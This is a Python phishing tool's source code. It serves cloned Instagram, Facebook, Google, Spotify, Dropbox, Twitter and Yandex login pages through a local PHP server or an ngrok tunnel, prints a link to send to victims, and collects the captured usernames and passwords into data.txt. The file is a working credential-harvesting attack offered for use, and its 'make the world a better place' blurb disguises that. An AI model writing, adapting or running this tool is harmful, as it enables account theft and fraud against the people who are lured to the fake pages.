import sys
import os
import re
import time
import random
import subprocess
# Try to import error
try:
    os.system("clear")
    import requests
except ImportError:
    print("Import requests module \n pip3 install requests")
except KeyboardInterrupt:
    print("[!] Exiting")
    sys.exit()


# Define some color code-----------------------
r = '\033[31;1m'
g = "\033[32;1m"
o = "\033[33;1m"
pu = "\033[35;1m"
c = "\033[36;1m"
y = "\033[93;1m"
w = "\033[0;1m"
p = "\033[95;1m"
# Color coding end here
# Make a banner function here-------------------


def banner():
    print(f"""{pu}
                                                            
                                                  
                                                  
                %&%%%%%%%%%%%%%%%   ////////*     
            &%%%%%%%%%%%%%%%%%%%   ////////       
         &%%%%%%%%%%%%%%%%%%%&   /////////        
       &%%%%%%%%%%%%&%*                           
      &%%%%%%%%%&                                 
    /%%%%%%%%%%                                   
    &%%%%%%%%%                                    
   #%%%%%%%%%      %&%%%%%%%%%%%%%%%%%%%%%%%%.    
   %%%%%%%%%%        &%%%%%%%%%%%%%%%%%%%%%%%%%   
   *&%%%%%%%&         &%%%%%%%%%%%%%%%%%%%%%%%%   
    &%%%%%%%%%         &&%%%%%%%%%%%%%%%%%%%%&/   
     &%%%%%%%%%%                   %%%%%%%%%&%    
      &%%%%%%%%%%&.             &%%%%%%%%%%&      
       .%%%%%%%%%%%%%%&&&&&%&%%%%%%%%%%%%%%       
          &%%%%%%%%%%%%%%%%%%%%%%%%%%&%&%         
             &&%%%%%%%%%%%%%%%%%%%&&&%            
                 (%&&%%%&&&&%&&%%                 
                                                  
                                     Powered by: Good Boys """)


banner()


# Banner making end here-------------------------
# First chekck for interner connection
def internet():
    try:
        res = requests.get("https://google.com")
        if res.status_code == 200:
            print(f"{w}[{c}!{w}] {g} Internet connection found.")
        else:
            print(f"{y}[{r}!{y}] {g} Something went wrong")
    except KeyboardInterrupt:
        print(f"{r}[{c}!{r}] {pu} Exiting-----> ")
        sys.exit()
        time.sleep(2)
    except:
        print(f"{r}[{c}!{r}] {y} Please on your internet connection")


internet()
# Internet function end here
# Make a directory


def mk_dir():
    try:
        os.makedirs("pweb")
    except FileExistsError:
        print()
    except:
        print(f"{w} ----Someting went wrong------")


mk_dir()
# Dir function end here
# Make a function for user data---------


def user_data(server):
    while True:
        if os.path.exists(f"pweb/{server}/userlog.txt"):
            print(f"{w}[{g}+{w}] {y} User data found")
            os.system(f"cat pweb/{server}/userlog.txt")
            os.system(f"cat pweb/{server}/userlog.txt >> data.txt")
            print()
            print(f"{y}[{g}+{y}] {r} Username and password saved into data.txt")
            os.system(f"rm -rf pweb/{server}/userlog.txt")
        else:
            pass


# Make a function for handling Localhost
def l_host(server):
    path = f"sites/{server}"
    des = "pweb/"
    os.system(f"cp -R {path} {des}")
    print("\n")
    print(f"{r}[{w}~{r}] {g} Select any ")
    print()
    print(f"{y}[{g}01{y}] {r} Localhost--Random--")
    print(f"{y}[{g}02{y}] {r} Localhost--Custom--")
    port_ = random.randint(1150, 9999)
    l_optn = input(f"{y}[{g}~{y}] {w} Choose option: ")
    if l_optn == "1" or l_optn == "01":
        os.system(
            f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        user_data(server)
    if l_optn == "2" or l_optn == "02":
        print()
        port_ = int(input(f"{r}[{g}+{r}] {y} Enter a portnumber: "))
        os.system(
            f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        print(f"{r}[{w}+{r}] {g} Localhost started on http://127.0.0.1:{port_}")
        user_data(server)
# Make a ngrok host


def ngrok_s(server):
    try:
        path = f"sites/{server}"
        des = "pweb/"
        os.system(f"cp -R {path} {des}")
        print("\n")
        port_ = random.randint(1150, 9999)
        os.system(
            f"php -S 127.0.0.1:{port_} -t pweb/{server} > /dev/null 2>&1 & sleep 2")
        os.system(
            f"./ngrok http http://127.0.0.1:{port_} > /dev/null 2>&1 & sleep 8")
        os.system(f'echo -ne "Send this link: "')
        os.system(
            f'curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io"')
        user_data(server)
    except:
        print()
        time.sleep(2)
        sys.exit(1)


# Asking for link forwoding option
def host_optn(server):
    print("\n")
    print(f"{p}[{g}~{p}] {w} Link generating option")
    print()
    print(f"{w}[{y}01{w}] {g} Localhost")
    print(f"{w}[{y}02{w}] {g} Ngrok")
    print()
    h_optn = input(f"{r}[{w}×{r}] {y} Choose option: ")
    if h_optn == "1" or h_optn == "01":
        l_host(server)
    elif h_optn == "2" or h_optn == "02":
        ngrok_s(server)

# Make options for websites..


def optn():
    print(f"{y}[{g}01{y}] {c} Instagram     {y}[{g}05{y}] {c} Dropbox ")
    print(f"{y}[{g}02{y}] {c} Facebook      {y}[{g}06{y}] {c} Twitter ")
    print(f"{y}[{g}03{y}] {c} Google        {y}[{g}07{y}] {c} Yandex ")
    print(f"{y}[{g}04{y}] {c} Spotify       {y}[{g}08{y}] {c} About us ")


optn()
# Let's read the user input----------
print("\n")
try:
    optn = input(f"{w}[{g}×{w}] {p} Choose an option: ")
except KeyboardInterrupt:
    time.sleep(1)
    sys.exit()
# Make handle for user input----------------
if optn == '1' or optn == '01':
    host_optn("instagram")
elif optn == '2' or optn == '02':
    host_optn("facebook")
elif optn == '3' or optn == '03':
    host_optn("google")
elif optn == '4' or optn == '04':
    host_optn("spotify")
elif optn == '5' or optn == '05':
    host_optn("dropbox")
elif optn == '6' or optn == '06':
    host_optn("twitter")
elif optn == '7' or optn == '07':
    host_optn("yandex")

elif optn == '08' or optn == '8':
    print(f"'Good Boy Associates' is a small developer group formed by a group of college students with a mission to make the world a better place.")
else:
    print("\n")
    print(f"{r}[{y}!{r}] {g} Invalid option ")
    time.sleep(1)
    sys.exit()

